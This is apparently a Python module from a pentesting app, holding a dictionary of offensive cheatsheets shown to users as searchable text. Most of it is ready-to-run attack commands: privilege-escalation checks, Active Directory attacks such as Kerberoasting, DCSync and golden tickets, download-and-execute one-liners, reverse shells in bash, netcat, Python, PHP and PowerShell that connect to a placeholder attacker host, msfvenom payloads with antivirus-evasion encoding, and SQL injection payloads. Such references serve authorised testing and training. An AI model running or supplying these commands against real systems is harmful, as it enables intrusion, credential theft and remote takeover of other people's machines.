"""
Cheatsheets - quick reference for common pentesting tasks
Displayed in the UI as searchable text.
"""

CHEATSHEETS = {
    "Linux Privesc": """╔═══════════════════════════════════════════════════════════╗
║  LINUX PRIVILEGE ESCALATION — Quick Wins                  ║
╚═══════════════════════════════════════════════════════════╝

── KERNEL ──
uname -a
cat /etc/os-release
# → Check searchsploit for kernel version

── SUDO ──
sudo -l                       # What can we run?
sudo -V                       # Sudo version (CVE-2019-14287, CVE-2021-3156)
# GTFOBins: check any binary in sudo -l output

── SUID / GUID ──
find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null
# → Any binary here, check GTFOBins.github.io

── CAPABILITIES ──
getcap -r / 2>/dev/null
# cap_setuid+ep on python/perl/ruby = root shell

── CRON JOBS ──
cat /etc/crontab
ls -la /etc/cron.*
systemctl list-timers
# pspy64 to watch cron in real time

── WRITABLE FILES/DIRS ──
find / -writable -type f 2>/dev/null | grep -v proc
find / -writable -type d 2>/dev/null | grep -v proc
# Check /etc/passwd, /etc/shadow, /etc/sudoers

── PATH HIJACKING ──
echo $PATH
# If . in PATH or writable dir before /usr/bin → exploit

── CREDS IN FILES ──
grep -r "password" /var/www 2>/dev/null
grep -r "PASSWORD" /etc 2>/dev/null
cat ~/.bash_history
cat ~/.ssh/id_rsa
find / -name "*.conf" -readable 2>/dev/null | head

── DOCKER / LXD ──
id                             # If in 'docker' group → root
# docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# lxd: lxc init alpine container -c security.privileged=true

── NFS ──
showmount -e <target>
# no_root_squash exploit

── AUTO ──
wget http://YOUR_IP/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh | tee linpeas.out
""",

    "Windows Privesc": """╔═══════════════════════════════════════════════════════════╗
║  WINDOWS PRIVILEGE ESCALATION                             ║
╚═══════════════════════════════════════════════════════════╝

── SYSTEM INFO ──
systeminfo
wmic qfe get Caption,Description,HotFixID,InstalledOn  # patches
whoami /all
whoami /priv

── PRIVILEGES (if current user has) ──
SeImpersonatePrivilege   → JuicyPotato / PrintSpoofer / RoguePotato
SeAssignPrimaryToken     → same
SeBackupPrivilege        → read SAM/SYSTEM hives
SeRestorePrivilege       → write to protected files
SeDebugPrivilege         → inject into any process
SeTakeOwnershipPrivilege → take over files
SeLoadDriverPrivilege    → load kernel driver

── UNQUOTED SERVICE PATHS ──
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\\\" | findstr /i /v \"\\"\"

── SERVICES WITH WEAK PERMS ──
accesschk.exe -uwcqv "Authenticated Users" *
sc config <service> binpath= "C:\\path\\evil.exe"

── STORED CREDS ──
cmdkey /list
dir C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Credentials\\
reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" /v DefaultPassword

── AUTORUNS / SCHEDULED TASKS ──
schtasks /query /fo LIST /v
reg query "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"

── UAC BYPASS ──
fodhelper, eventvwr, computerdefaults (check MSF modules)

── AUTO ──
.\\winPEASx64.exe
# Or:
iex(new-object net.webclient).downloadstring('http://IP/winpeas.ps1')
""",

    "Active Directory": """╔═══════════════════════════════════════════════════════════╗
║  ACTIVE DIRECTORY — Common Attacks                        ║
╚═══════════════════════════════════════════════════════════╝

── ENUMERATION ──
netexec smb <target> -u user -p pass --shares --users
enum4linux -a <target>
ldapsearch -x -H ldap://<DC> -b "DC=domain,DC=local"

── PASSWORD SPRAYING ──
kerbrute passwordspray -d domain.local --dc <DC> users.txt Winter2024
netexec smb <targets> -u users.txt -p 'Winter2024' --continue-on-success

── AS-REP ROASTING (DONT_REQ_PREAUTH) ──
impacket-GetNPUsers domain.local/ -usersfile users.txt -no-pass -dc-ip <DC>
hashcat -m 18200 hashes.txt rockyou.txt

── KERBEROASTING (TGS-REP from SPN) ──
impacket-GetUserSPNs domain.local/user:pass -dc-ip <DC> -request
hashcat -m 13100 hashes.txt rockyou.txt

── PASS THE HASH ──
netexec smb <target> -u user -H <NTLM_hash>
impacket-psexec -hashes :<NTLM> domain/user@<target>
evil-winrm -i <target> -u user -H <hash>

── DCSYNC (needs DS-Replication-Get-Changes) ──
impacket-secretsdump domain/user:pass@<DC>
netexec smb <DC> -u user -p pass --ntds

── GOLDEN TICKET (krbtgt hash) ──
impacket-ticketer -nthash <krbtgt_hash> -domain-sid S-1-5-... -domain domain.local fakeuser
export KRB5CCNAME=fakeuser.ccache
impacket-psexec -k -no-pass domain/fakeuser@<target>

── BLOODHOUND ──
bloodhound-python -d domain.local -u user -p pass -ns <DC> -c all
# Then load .json files in BloodHound GUI

── USEFUL LDAP QUERIES ──
# Domain admins:
(&(objectCategory=user)(memberOf=CN=Domain Admins,CN=Users,DC=...))
# Kerberoastable:
(&(samAccountType=805306368)(servicePrincipalName=*))
# AS-REP roastable:
(&(userAccountControl:1.2.840.113556.1.4.803:=4194304))
""",

    "Pivoting": """╔═══════════════════════════════════════════════════════════╗
║  PIVOTING & TUNNELING                                     ║
╚═══════════════════════════════════════════════════════════╝

── SSH PORT FORWARDING ──
# Local forward (access remote service locally):
ssh -L 8080:127.0.0.1:80 user@pivot-host
# Remote forward (expose local to remote):
ssh -R 4444:127.0.0.1:4444 user@pivot-host
# Dynamic (SOCKS proxy):
ssh -D 1080 user@pivot-host
# Then use proxychains to route traffic

── PROXYCHAINS ──
# /etc/proxychains.conf:
socks5 127.0.0.1 1080
# Usage:
proxychains nmap -sT -Pn <internal_ip>

── CHISEL (TCP tunnel over HTTP) ──
# Server (your machine):
./chisel server -p 8000 --reverse
# Client (pivot):
./chisel client <YOUR_IP>:8000 R:1080:socks

── LIGOLO-NG (recommended) ──
# Server (your machine):
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert
# Agent (pivot):
./agent -connect <YOUR_IP>:11601 -ignore-cert

── SOCAT RELAY ──
socat TCP-LISTEN:2222,fork TCP:internal-host:22

── WINDOWS netsh ──
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=internal-ip
""",

    "File Transfer": """╔═══════════════════════════════════════════════════════════╗
║  FILE TRANSFER                                            ║
╚═══════════════════════════════════════════════════════════╝

── HTTP SERVER (attacker) ──
python3 -m http.server 8000
# or with upload support:
python3 -c "import http.server; http.server.test(HandlerClass=http.server.SimpleHTTPRequestHandler)"
# SMB:
impacket-smbserver share . -smb2support
# (or with auth: -username foo -password bar)

── DOWNLOAD ON LINUX TARGET ──
wget http://IP:8000/linpeas.sh
curl -O http://IP:8000/linpeas.sh
curl http://IP:8000/linpeas.sh | bash

── DOWNLOAD ON WINDOWS TARGET ──
# Powershell (modern):
iwr http://IP:8000/winpeas.exe -o C:\\tmp\\w.exe
# IEX (run in memory, no file):
iex(new-object net.webclient).downloadstring('http://IP:8000/s.ps1')
# certutil:
certutil -urlcache -f http://IP:8000/file.exe file.exe
# bitsadmin:
bitsadmin /transfer j /priority normal http://IP:8000/f.exe c:\\t\\f.exe

── SMB FROM WINDOWS ──
copy \\\\IP\\share\\file.exe .
dir \\\\IP\\share\\

── BASE64 (small files, through shells) ──
# On source:
base64 file.txt > file.b64
# On target: copy-paste, then:
base64 -d file.b64 > file.txt

── NETCAT ──
# Receiver:
nc -lvnp 4444 > file.out
# Sender:
nc IP 4444 < file.in
""",

    "Reverse Shells": """╔═══════════════════════════════════════════════════════════╗
║  REVERSE SHELL ONELINERS                                  ║
║  Replace {IP} and {PORT}                                  ║
╚═══════════════════════════════════════════════════════════╝

── LISTENER ──
nc -lvnp {PORT}
# or better:
rlwrap nc -lvnp {PORT}
# or: use the Listener tab in this app

── BASH ──
bash -i >& /dev/tcp/{IP}/{PORT} 0>&1

── BASH ({} expansion, bypasses some filters) ──
bash -c '{bash,-i}>{/dev/tcp/{IP}/{PORT}}0>&1'

── NETCAT ──
nc -e /bin/bash {IP} {PORT}
nc -c bash {IP} {PORT}
# No -e support:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {IP} {PORT} >/tmp/f

── PYTHON ──
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

── PHP ──
php -r '$sock=fsockopen("{IP}",{PORT});exec("/bin/sh -i <&3 >&3 2>&3");'

── POWERSHELL ──
$c = New-Object System.Net.Sockets.TCPClient("{IP}",{PORT});$s=$c.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $d 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sby = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()

── TTY UPGRADE (AFTER CATCH) ──
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z (to background)
stty raw -echo; fg
# Then ENTER twice, you're good
""",

    "Msfvenom Payloads": """╔═══════════════════════════════════════════════════════════╗
║  MSFVENOM QUICK REFERENCE                                 ║
║  Replace LHOST/LPORT                                      ║
╚═══════════════════════════════════════════════════════════╝

── LIST PAYLOADS ──
msfvenom -l payloads | grep reverse_tcp

── LINUX EXECUTABLE ──
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf -o shell.elf

── WINDOWS EXE ──
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f exe -o shell.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o mshell.exe

── WINDOWS DLL ──
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f dll -o shell.dll

── PHP WEB ──
msfvenom -p php/reverse_php LHOST=IP LPORT=4444 -f raw -o shell.php

── ASPX WEB ──
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f aspx -o shell.aspx

── JSP WEB ──
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.jsp

── WAR ──
msfvenom -p java/shell_reverse_tcp LHOST=IP LPORT=4444 -f war -o shell.war

── PYTHON ──
msfvenom -p python/shell_reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.py

── SHELLCODE (for exploits) ──
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f python -b "\\x00\\x0a"

── ENCODING (basic AV evasion) ──
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 \\
  -e x86/shikata_ga_nai -i 5 -f exe -o enc.exe

── HANDLER (MSF listener) ──
msfconsole -q -x "use multi/handler; set PAYLOAD windows/x64/shell_reverse_tcp; set LHOST IP; set LPORT 4444; run"
""",

    "Hash Cracking": """╔═══════════════════════════════════════════════════════════╗
║  HASH IDENTIFICATION & CRACKING                           ║
╚═══════════════════════════════════════════════════════════╝

── IDENTIFY ──
hashid <hash>
hash-identifier
# Online: hashes.com/en/tools/hash_identifier

── HASHCAT MODES (-m) ──
0     MD5
100   SHA1
1000  NTLM              ← Windows local hashes (SAM)
1400  SHA256
1700  SHA512
3000  LM
3200  bcrypt
5600  NetNTLMv2         ← Responder captures
13100 Kerberos TGS-REP  ← Kerberoasting
18200 Kerberos AS-REP   ← AS-REP roasting
5500  NetNTLMv1
7500  Kerberos 5 AS-REQ Pre-Auth
1800  SHA512crypt       ← /etc/shadow $6$
500   MD5crypt          ← /etc/shadow $1$
2100  DCC2 / MSCACHEv2

── HASHCAT BASIC ──
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
# Rules:
hashcat -m 1000 h.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
# Mask attack:
hashcat -m 1000 h.txt -a 3 ?u?l?l?l?l?l?d?d
# ?l lower ?u upper ?d digit ?s special ?a all

── JOHN ──
john --wordlist=rockyou.txt hashes.txt
john --format=nt hashes.txt --wordlist=rockyou.txt
john --show hashes.txt

── UNSHADOW (Linux) ──
unshadow /etc/passwd /etc/shadow > combined.txt
john --wordlist=rockyou.txt combined.txt

── SSH KEY CRACKING ──
ssh2john id_rsa > id_rsa.hash
john --wordlist=rockyou.txt id_rsa.hash

── ZIP / PDF / OFFICE ──
zip2john file.zip > hash
pdf2john file.pdf > hash
office2john file.docx > hash
""",

    "SQLi Cheatsheet": """╔═══════════════════════════════════════════════════════════╗
║  SQL INJECTION                                            ║
╚═══════════════════════════════════════════════════════════╝

── DETECTION ──
'  "  ;  --  #
' OR 1=1--
' AND 1=1--   vs   ' AND 1=2--   → differing responses = injectable

── AUTH BYPASS ──
' OR '1'='1
' OR 1=1--
admin'--
admin'/*
' OR 1=1 LIMIT 1--

── UNION-BASED (steps) ──
1. ' ORDER BY 1--    increment until error → column count
2. ' UNION SELECT 1,2,3--    find reflected columns
3. ' UNION SELECT database(),version(),user()--
4. ' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--
5. ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
6. ' UNION SELECT username,password FROM users--

── BLIND BOOLEAN ──
' AND SUBSTRING(version(),1,1)='5'--
' AND (SELECT COUNT(*) FROM users) > 0--

── BLIND TIME-BASED ──
'; SELECT IF(1=1, SLEEP(5), 0)--     (MySQL)
'; SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END--   (Postgres)
'; WAITFOR DELAY '0:0:5'--    (MSSQL)

── SQLMAP ──
sqlmap -u "http://target/page.php?id=1"
sqlmap -u "http://target/page.php?id=1" --dbs
sqlmap -u "http://target/page.php?id=1" -D dbname --tables
sqlmap -u "http://target/page.php?id=1" -D dbname -T users --dump
sqlmap -u "http://target/page.php?id=1" --os-shell

── POST REQUEST ──
sqlmap -r request.txt --batch
sqlmap -u "http://t/p" --data="user=admin&pass=x" --dbs

── COOKIE ──
sqlmap -u "http://t/" --cookie="session=XXX" --level=3
""",
}


def get_cheatsheet(name: str) -> str:
    return CHEATSHEETS.get(name, "Cheatsheet not found.")


def list_cheatsheets() -> list[str]:
    return list(CHEATSHEETS.keys())
